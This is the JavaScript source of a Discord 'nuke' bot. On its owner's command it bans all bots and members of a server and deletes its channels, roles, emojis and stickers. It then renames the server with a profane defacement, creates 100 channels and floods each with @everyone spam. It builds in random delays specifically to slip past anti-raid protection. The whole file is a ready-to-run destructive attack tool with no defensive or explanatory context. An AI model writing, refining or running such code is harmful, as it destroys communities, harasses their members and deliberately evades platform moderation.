const {
  Client,
  GatewayIntentBits,
  GuildScheduledEventPrivacyLevel,
  GuildScheduledEventEntityType
} = require('discord.js');

const { sendInviteOnJoin } = require('./inviteOnJoin');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildModeration,
    GatewayIntentBits.GuildEmojisAndStickers,
    GatewayIntentBits.GuildIntegrations,
    GatewayIntentBits.GuildWebhooks,
    GatewayIntentBits.GuildInvites,
    GatewayIntentBits.GuildVoiceStates,
    GatewayIntentBits.GuildPresences,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildMessageReactions,
    GatewayIntentBits.GuildMessageTyping,
    GatewayIntentBits.DirectMessages,
    GatewayIntentBits.DirectMessageReactions,
    GatewayIntentBits.DirectMessageTyping,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildScheduledEvents,
    GatewayIntentBits.AutoModerationConfiguration,
    GatewayIntentBits.AutoModerationExecution
  ]
});

// =================================================================
// === EASILY EDITABLE SETTINGS - CHANGE VALUES HERE ONLY ===
// =================================================================
const OWNER_ID = '1406363416230232158';

// --- Server Defacement Settings ---
const NEW_SERVER_NAME = 'FUCKED BY WEST';
const EVENT_NAME = 'FUCKED BY WEST';
const EVENT_DESCRIPTION = 'This server has been completely and utterly FUCKED BY WEST. There is nothing left.';

// --- Channel Creation & Spamming Settings ---
const CHANNEL_NAMES = ['fucked by west', 'owned by west', 'shit on by west', 'west was here', 'gg ez by west', 'get rekt by west'];
const CHANNELS_TO_CREATE = 100;
const SPAM_MESSAGE = '@everyone THIS SERVER HAS BEEN FUCKED BY WEST';
const SPAM_COUNT_PER_CHANNEL = 100;

// --- Audit Log Reasons ---
const BAN_REASON = 'Fucked by West';
const DELETE_REASON = 'Owned by West';

// --- Anti-Raid Bypass Settings ---
const ENABLE_RANDOM_DELAYS = true; // Set to 'true' to add tiny random delays to bypass simple detection.
const MAX_DELAY_MS = 50; // Maximum random delay in milliseconds.

// =================================================================
// === DO NOT EDIT BELOW THIS LINE (unless you know what you are doing) ===
// =================================================================

// A simple function to get a random integer
function getRandomInt(min, max) {
    min = Math.ceil(min);
    max = Math.floor(max);
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

// A function to add a random delay if enabled
async function randomDelay() {
    if (ENABLE_RANDOM_DELAYS) {
        const delay = getRandomInt(1, MAX_DELAY_MS);
        return new Promise(resolve => setTimeout(resolve, delay));
    }
    return Promise.resolve();
}

client.on('guildCreate', async (guild) => {
  await sendInviteOnJoin(guild);
});

client.once('ready', () => {
    console.log(`Logged in as ${client.user.tag}`);
    console.log('Optimized Nuke bot with anti-raid bypass is ready.');
});

client.on('messageCreate', async (message) => {
    if (message.author.bot) return;
    if (message.content === '!start') {
        if (message.author.id !== OWNER_ID) {
            return message.reply('You do not have permission to use this command.');
        }
        const guild = message.guild;
        if (!guild) return message.reply('This command can only be used in a server.');

        const startTime = Date.now();
        console.log(`[${new Date().toISOString()}] Nuke sequence initiated in server: ${guild.name} (${guild.id})`);

        try {
            // --- PHASE 0: INSTANT BOT NEUTRALIZATION ---
            console.log('--- Phase 0: Banning all other bots instantly ---');
            const allMembers = await guild.members.fetch();
            const botsToBan = allMembers.filter(member => member.user.bot && member.user.id !== client.user.id);
            console.log(`Found \${botsToBan.size} bots to ban.`);
            const botBanPromises = botsToBan.map(member => member.ban({ reason: BAN_REASON }).catch(err => console.error(`Failed to ban bot ${member.user.tag}: ${err.message}`)));
            await Promise.all(botBanPromises);
            console.log('All other bots have been banned.');

            // --- PHASE 1: CONCURRENT DESTRUCTION ---
            console.log('--- Starting Concurrent Destruction Phase ---');
            const members = allMembers.filter(member => !member.user.bot && member.user.id !== OWNER_ID && member.user.id !== client.user.id);
            const [channels, roles, emojis, stickers] = await Promise.all([
                guild.channels.fetch(),
                guild.roles.fetch(),
                guild.emojis.fetch(),
                guild.stickers.fetch()
            ]);

            const banPromises = members.map(member => randomDelay().then(() => member.ban({ reason: BAN_REASON }).catch(err => console.error(`Failed to ban ${member.user.tag}: ${err.message}`))));
            const deleteChannelPromises = channels.map(channel => randomDelay().then(() => channel.delete(DELETE_REASON).catch(err => console.error(`Failed to delete channel ${channel.name}: ${err.message}`))));
            const deleteRolePromises = roles
                .filter(role => role.position > 0 && !role.managed)
                .map(role => randomDelay().then(() => role.delete(DELETE_REASON).catch(err => console.error(`Failed to delete role ${role.name}: ${err.message}`))));

            // Added: Emoji Deletion Promises
            const deleteEmojiPromises = emojis.map(emoji => randomDelay().then(() => emoji.delete(DELETE_REASON).catch(err => console.error(`Failed to delete emoji ${emoji.name}: ${err.message}`))));

            // Added: Sticker Deletion Promises
            const deleteStickerPromises = stickers.map(sticker => randomDelay().then(() => sticker.delete(DELETE_REASON).catch(err => console.error(`Failed to delete sticker ${sticker.name}: ${err.message}`))));

            await Promise.all([...banPromises, ...deleteChannelPromises, ...deleteRolePromises, ...deleteEmojiPromises, ...deleteStickerPromises]);
            console.log('--- Destruction Phase Complete ---');

            // --- PHASE 2: CONCURRENT DEFACEMENT & SPAMMING ---
            console.log('--- Starting Concurrent Defacement & Spamming Phase ---');
            await Promise.all([
                guild.setName(NEW_SERVER_NAME),
                guild.setIcon(null),
                guild.setBanner(null)
            ]);
            console.log('Server name, icon, and banner updated.');

            const channelCreationPromises = Array.from({ length: CHANNELS_TO_CREATE }, () => {
                const channelName = CHANNEL_NAMES[Math.floor(Math.random() * CHANNEL_NAMES.length)];
                return guild.channels.create({ name: channelName, reason: DELETE_REASON }).catch(err => console.error(`Failed to create a channel: ${err.message}`));
            });
            const createdChannels = await Promise.all(channelCreationPromises);
            console.log(`Finished creating ${createdChannels.filter(c => c).length} channels.`);

            const textChannels = createdChannels.filter(channel => channel && channel.isTextBased());
            console.log(`Starting to spam \${textChannels.length} channels concurrently...`);
            const spamPromises = textChannels.map(channel => {
                const channelSpamPromises = Array.from({ length: SPAM_COUNT_PER_CHANNEL }, () => channel.send(SPAM_MESSAGE).catch(err => console.error(`Failed to send message in ${channel.name}: ${err.message}`)));
                return Promise.all(channelSpamPromises);
            });
            await Promise.all(spamPromises);
            console.log('Finished spamming channels.');

            // --- PHASE 3: EVENT CREATION ---
            console.log(`Creating event "\${EVENT_NAME}"...`);
            try {
                const eventTimestamp = Date.now() + (60 * 60 * 1000);
                // Create a dedicated voice channel for the event
                const eventChannel = await guild.channels.create({
                    name: 'EVENT VOICE CHANNEL',
                    type: 'GUILD_VOICE',
                    reason: DELETE_REASON
                });

                await guild.scheduledEvents.create({
                    name: EVENT_NAME,
                    scheduledStartTime: new Date(eventTimestamp),
                    privacyLevel: GuildScheduledEventPrivacyLevel.GuildOnly,
                    entityType: GuildScheduledEventEntityType.Voice,
                    channel: eventChannel.id, // Use the newly created voice channel
                    description: EVENT_DESCRIPTION,
                    reason: DELETE_REASON
                });
                console.log('Event created successfully.');
            } catch (err) {
                console.error(`Failed to create event: \${err.message}`);
            }

                      const endTime = Date.now();
            console.log(`--- Nuke & Deface Sequence Complete ---`);
            console.log(`Total execution time: ${(endTime - startTime) / 1000} seconds.`);
        } catch (error) {
            console.error('A critical error occurred during the sequence:', error);
        }
    }
});

client.login(BOT_TOKEN);